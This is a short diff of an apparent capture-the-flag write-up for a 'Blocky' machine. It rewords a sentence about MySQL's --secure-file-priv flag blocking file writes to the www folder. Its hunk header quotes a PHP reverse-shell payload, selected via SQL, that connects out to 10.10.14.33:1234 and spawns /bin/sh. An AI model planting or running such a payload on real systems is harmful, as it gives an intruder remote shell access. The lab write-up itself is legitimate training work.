@@ -127,7 +127,7 @@ SELECT '<?php $sock=fsockopen("10.10.14.33",1234);exec("/bin/sh -i <&3 >&3 2>&3"
 
 ![](/assets/img/blocky/2020-10-22-18-05-16.png)
 
-It was a nice idea but it won't work if `--secure-file-priv` is enabled. This flag does not enable us to write in to the `www` folder :(
+It was a nice idea but it won't work if `--secure-file-priv` is enabled. This flag does not allow us to write in to the `www` folder and cannot be disabled from phpMyAdmin AFAIK.
 
 ```sql
 SHOW VARIABLES LIKE "secure_file_priv";
